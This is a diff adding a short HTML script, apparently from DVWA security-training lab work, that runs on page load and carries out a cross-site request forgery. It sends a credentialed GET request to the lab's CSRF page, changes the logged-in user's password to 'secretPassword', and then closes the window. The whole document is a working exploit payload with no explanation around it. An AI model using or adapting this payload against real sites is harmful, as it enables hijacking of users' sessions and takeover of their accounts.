@@ -1,0 +1,15 @@
+<script>
+
+  function start(){
+  	let host = "localhost"
+  	let url = `http://${host}/dvwa/vulnerabilities/csrf/?password_new=secretPassword&password_conf=secretPassword&Change=Change`
+  	let xmlReq = new XMLHttpRequest();
+  	xmlReq.open("GET", url, true)
+  	xmlReq.withCredentials = true
+  	xmlReq.send()
+    window.close()
+  }
+  
+  start()
+
+</script>
